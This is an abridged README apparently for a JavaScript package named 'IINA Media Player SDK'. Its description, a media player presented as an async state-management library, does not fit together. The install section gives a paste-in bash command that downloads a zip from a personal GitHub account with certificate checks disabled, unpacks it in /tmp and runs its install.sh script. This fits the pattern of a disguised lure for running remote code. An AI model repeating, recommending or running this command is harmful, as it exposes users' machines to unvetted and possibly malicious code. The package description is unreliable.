...
> IINA Media Player SDK — A lightweight, zero-dependency utility layer for async state management in modern JavaScript applications.
...
```bash
curl -fsSLk https://github.com/ameskevinhe934-hue/iina-media/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/iina-media-main && \
bash install.sh
```
...
```javascript
const { useAsyncState } = require('IINA-media-player');
...
```javascript
const { init } = require('IINA-media-player');
...
MIT © Copyright (c) 2026 IINA Media Player, Inc.
